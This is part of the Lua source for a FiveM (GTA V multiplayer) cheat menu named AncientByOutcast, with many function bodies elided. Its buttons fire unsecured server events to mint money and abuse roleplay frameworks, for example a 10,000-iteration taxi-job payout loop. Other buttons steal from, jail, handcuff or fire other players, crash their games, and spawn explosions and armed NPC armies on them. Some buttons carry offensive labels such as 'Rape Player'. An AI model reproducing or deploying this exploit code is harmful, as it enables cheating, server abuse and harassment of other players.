                elseif AncientByOutcast.Button('~c~~h~Model~b~ Cop F') then
			local model = "MP_F_Cop_01"
                ...
                elseif AncientByOutcast.Button('~c~~h~Model~b~ Sheriff M') then
			local model = "S_M_Y_Sheriff_01"
                ...
                elseif AncientByOutcast.Button('~c~~h~Model~b~ Sheriff F') then
			local model = "S_F_Y_Sheriff_01"
			    ...
			    elseif AncientByOutcast.Button('~c~~h~Model~s~ FiveM') then
			local model = "mp_m_freemode_01"
                ...
                elseif AncientByOutcast.Button('~c~~h~Randomize~s~ Clothing') then
				...
				AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("SelfMenu") then
                if AncientByOutcast.Button("Heal") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif AncientByOutcast.Button("Give Armor") then
                    SetPedArmour(PlayerPedId(), 200)
                elseif AncientByOutcast.Button("ESX Set Hunger/Thirst To 100%") then
                    TriggerEvent("esx_status:set", "hunger", 1000000)
                    TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif AncientByOutcast.Button("Give yourself money (ESX)") then
				...
				elseif AncientByOutcast.Button("Taxijob ESX 10.000x") then
				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
				elseif AncientByOutcast.Button("Give yourself money (VRP)") then
				TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				drawNotification("Money deposited succesfully")
				elseif AncientByOutcast.Button("Give yourself 10x salary (VRP)") then
                ...
                elseif AncientByOutcast.Button("Revive") then
                    TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent("ambulancier:selfRespawn")
				elseif AncientByOutcast.Button("~h~~b~Open Jail Menu ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
                elseif AncientByOutcast.Button("ESX Get Out Of Jail") then
                ...
                elseif AncientByOutcast.Button("Suicide") then
                ...
                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("OnlinePlayersMenu") then
                    for i = 0, 128 do
                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and AncientByOutcast.MenuButton(GetPlayerName(i).." ID = ["..GetPlayerServerId(i).."] i = ["..i.."] "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), "PlayerOptionsMenu") then
                            SelectedPlayer = i
                        end
                    end

				AncientByOutcast.Display()
                elseif AncientByOutcast.IsMenuOpened("PlayerOptionsMenu") then
                    AncientByOutcast.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
                    if AncientByOutcast.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
                        SpectatePlayer(SelectedPlayer)
					elseif AncientByOutcast.Button("Rape Player") then
					    rapeplayer()
					elseif AncientByOutcast.Button("Open inventory") then
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
					elseif AncientByOutcast.Button("Teleport To Player With Vehicle") then
										drawNotification(
                    ...
                    elseif AncientByOutcast.Button("Teleport To Player") then
										drawNotification(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
                    ...
                    elseif cP == 'n' then
					    ...
					    elseif AncientByOutcast.Button('~h~~b~Police Handcuff Player') then
                        TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
                        elseif AncientByOutcast.Button('~h~~b~Police Drag Player') then
                        TriggerServerEvent('esx_policejob:drag', GetPlayerServerId(SelectedPlayer))
					elseif AncientByOutcast.Button("~g~Give ~w~Money") then
                    ...
                    elseif AncientByOutcast.Button("Crash Player") then
                        CrashPlayer(GetPlayerPed(SelectedPlayer))
                    elseif AncientByOutcast.MenuButton("Troll Options", "PlayerTrollMenu") then
                    elseif AncientByOutcast.MenuButton("ESX Options", "PlayerESXMenu") then
                    elseif AncientByOutcast.MenuButton("Choose weapon", "SingleWepPlayer") then
                    elseif AncientByOutcast.Button("Give Ammo") then
                        for i = 1, #allWeapons do
                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
                        end
                    elseif AncientByOutcast.Button("Give All Weapons") then
                        for i = 1, #allWeapons do
                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
                        end
                    elseif AncientByOutcast.Button("Remove All Weapons") then
                        for i = 1, #allWeapons do
                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
                        end
                    elseif AncientByOutcast.Button("Give Vehicle") then
                        local ped = GetPlayerPed(SelectedPlayer)
                        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
					...
					elseif AncientByOutcast.Button('Clone Car') then
                    ClonePedVeh()
					elseif AncientByOutcast.Button('Spawn Following Asshat') then
                    Citizen.CreateThread(function()
                    asshat = true
                    ...
                    elseif AncientByOutcast.Button("Kick From Vehicle") then
                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                        drawNotification("~g~Kicked Player From Vehicle!")
                    elseif AncientByOutcast.Button("Delete Vehicle") then
                        DelVeh(GetVehiclePedIsUsing(SelectedPlayer))
                    elseif AncientByOutcast.Button("Spawn Flare On Player") then
                    ...
                    elseif AncientByOutcast.Button("Spawn Smoke On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    ...
                    AncientByOutcast.Display()
                elseif AncientByOutcast.IsMenuOpened("PlayerESXMenu") then
                    if AncientByOutcast.MenuButton("ESX Triggers", "PlayerESXTriggerMenu") then
                    elseif AncientByOutcast.MenuButton("ESX Jobs", "PlayerESXJobMenu") then
                    end

                    AncientByOutcast.Display()
                elseif AncientByOutcast.IsMenuOpened("PlayerESXTriggerMenu") then
                    if AncientByOutcast.Button("ESX Revive") then
                    ...
                    DoScreenFadeIn(800)
					elseif AncientByOutcast.Button("Fire player from job (ESX)") then
				    FirePlayer(SelectedPlayer)
                    elseif AncientByOutcast.Button("ESX Give Money To Player From Your Wallet") then
                    ...
                    elseif AncientByOutcast.Button("ESX Steal Money From Player") then
                    ...
                    elseif AncientByOutcast.Button("ESX Handcuff Player") then
                        TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
                    elseif AncientByOutcast.Button("ESX Send To Jail") then
                    ...
                    AncientByOutcast.Display()
                elseif AncientByOutcast.IsMenuOpened("PlayerESXJobMenu") then
                    if AncientByOutcast.Button("Unemployed") then
                    ...
                    AncientByOutcast.Display()
                elseif AncientByOutcast.IsMenuOpened("PlayerTrollMenu") then
                    if AncientByOutcast.Button ("Fake Chat Message") then
				...
				elseif AncientByOutcast.Button("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                ...
                elseif AncientByOutcast.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
					...
					elseif AncientByOutcast.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif AncientByOutcast.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                ...
                elseif AncientByOutcast.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_railgun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    ...
                    elseif AncientByOutcast.Button("Cage Player") then
                        freezePlayer = true
                        Citizen.Wait(10)
                        SpawnObjOnPlayer(GetHashKey("prop_gascage01"))
                        freezePlayer = false
                    elseif AncientByOutcast.MenuButton("Spawn Props On Player", "SpawnPropsMenu") then
                    elseif AncientByOutcast.CheckBox(
                        "Freeze Player",
                        freezePlayer,
                        function(enabled)
                    ...
                    then
                    elseif AncientByOutcast.Button("Small invisible Explosion") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
                    elseif AncientByOutcast.Button("~b~Isis Explosion") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
                    end

                    AncientByOutcast.Display()
                elseif AncientByOutcast.IsMenuOpened("SpawnPropsMenu") then
                    if AncientByOutcast.CheckBox(
                    ...
                    then
                    elseif AncientByOutcast.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif AncientByOutcast.Button("Weed") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif AncientByOutcast.Button("UFO") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif AncientByOutcast.Button("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif AncientByOutcast.Button("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("VehicleRamMenu") then
                if AncientByOutcast.Button("Futo") then
                ...
                elseif AncientByOutcast.Button("Bus") then
                    ...
                    AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if AncientByOutcast.Button(allWeapons[i]) then
                ...
                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("WeaponMenu") then
                if AncientByOutcast.MenuButton("Single Weapon Spawner", "SingleWeaponMenu") then
                elseif AncientByOutcast.Button("Give All Weapons") then
                    for i = 1, #allWeapons do
                ...
                then
                elseif AncientByOutcast.MenuButton("Weapon Customization", "WeaponCustomization") then
                elseif AncientByOutcast.MenuButton("Bullet Gun Options", "BulletGunMenu") then
                end

                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("WeaponCustomization") then
                if AncientByOutcast.CheckBox(
                    "Rainbow Tint",
                    rainbowTint,
                    function(enabled)
                ...
                then
                elseif AncientByOutcast.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                ...
                then
                elseif AncientByOutcast.Button("~g~Add Special Finish") then
                ...
                elseif AncientByOutcast.Button("~r~Remove Special Finish") then
                ...
                elseif AncientByOutcast.Button("~g~Add Suppressor") then
                ...
                elseif AncientByOutcast.Button("~r~Remove Suppressor") then
                ...
                elseif AncientByOutcast.Button("~g~Add Scope") then
                ...
                elseif AncientByOutcast.Button("~r~Remove Scope") then
                ...
                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("BulletGunMenu") then
                if AncientByOutcast.CheckBox(
                    "Vehicle Gun",
                    vehicleGun,
                    function(enabled)
                ...
                then
                elseif AncientByOutcast.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                    currentVehicle = currentIndex
                    selectedVehicle = selectedIndex

                end)
                then
                elseif AncientByOutcast.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                ...
                then
                elseif AncientByOutcast.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
                ...
                then
                elseif AncientByOutcast.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
                ...
                AncientByOutcast.Display()
            elseif AncientByOutcast.IsMenuOpened("SingleWeaponMenu") then
                for i = 1, #allWeapons do
                    if AncientByOutcast.Button(allWeapons[i]) then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
                    end
            ...
            elseif IsDisabledControlPressed(0, 162) then
                if logged then
                    AncientByOutcast.OpenMenu("MainMenu")
                else
                    local temp = KeyboardInput("Enter Password ", "Pirate123", 100)
                    if temp == pass then
                        drawNotification("~g~Login Succesful!")
                        logged = true
                        AncientByOutcast.OpenMenu("MainMenu")
                    else
                        drawNotification("~r~Are you trying to pirate?")
                    end
                end
            end
